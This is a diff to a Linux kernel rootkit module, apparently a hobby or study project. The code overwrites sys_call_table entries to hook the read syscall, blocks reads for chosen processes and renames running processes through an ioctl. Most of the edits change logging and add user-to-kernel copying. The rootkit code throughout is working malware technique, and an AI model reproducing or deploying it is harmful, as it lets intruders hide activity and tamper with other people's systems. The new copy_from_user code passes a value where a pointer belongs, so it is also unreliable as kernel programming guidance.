@@ -40,12 +40,12 @@ MODULE_LICENSE("Dual MIT/GPL");
 MODULE_VERSION("0.1");
 
 static asmlinkage long my_sys_read(const struct pt_regs *regs) {
-  pr_info("my_sys_read\n");
+  printk(KERN_WARNING "my_sys_read\n");
   struct filter_info *pos;
   list_for_each_entry(pos, &filter_list.list, list) {
     if (strcmp(pos->comm, current->comm) == 0 && pos->syscall_nr == __NR_read) {
       pr_info("Filtering read syscall for process %s\n", pos->comm);
-      return -EPERM; // ????
+      return -1;
     }
   }
 
@@ -104,16 +104,26 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
   case IOCTL_MOD_MASQ:
     if (module_list == NULL)
       module_list = THIS_MODULE->list.prev;
-    struct masq_proc_req *req;
-    req = (struct masq_proc_req *)arg;
+    struct masq_proc_req *req = (struct masq_proc_req *)kmalloc(
+                             sizeof(struct masq_proc_req), GFP_KERNEL),
+                         *usr_req = (struct masq_proc_req *)arg;
+    req->list = (struct masq_proc *)kmalloc(
+        sizeof(struct masq_proc) * usr_req->len, GFP_KERNEL);
+    copy_from_user(req->len, &usr_req->len, sizeof(size_t));
+    pr_warn("copy_from_user done with len=%d\n", req->len);
+    for (int i = 0; i < usr_req->len; i++) {
+      struct masq_proc *entry = &usr_req->list[i];
+      copy_from_user(&req->list[i], entry, sizeof(struct masq_proc));
+      printk(KERN_WARNING "copy_from_user done with entry %d\n", i);
+    }
+    pr_warn("copy_from_user done with %d entries\n", req->len);
 
     for (int i = 0; i < req->len; i++) {
       struct masq_proc *entry = &req->list[i];
       if (strlen(entry->new_name) >= strlen(entry->orig_name)) {
         continue;
       }
-      printk(KERN_INFO "Masquerading %s as %s\n", entry->orig_name,
-             entry->new_name);
+      pr_warn("Masquerading %s as %s\n", entry->orig_name, entry->new_name);
       struct task_struct *task;
       for_each_process(task) {
         if (strcmp(task->comm, entry->orig_name) == 0) {
@@ -121,6 +131,10 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
         }
       }
     }
+
+    kfree(req->list);
+    kfree(req);
+
     break;
   case IOCTL_ADD_FILTER: {
     // copy from user space
@@ -225,7 +239,7 @@ static int __init rootkit_init(void) {
 
   sys_call_table_p = (syscall_fn_t *)kallsyms_lookup_name_fn("sys_call_table");
   // TODO: check type of update_mapping_prot
-  pr_info("sys_call_table at %p\n", sys_call_table_p);
+  pr_warn("sys_call_table at %p\n", sys_call_table_p);
   update_mapping_prot = (void *)kallsyms_lookup_name_fn("update_mapping_prot");
   if (!update_mapping_prot) {
     pr_err("Failed to find update_mapping_prot\n");
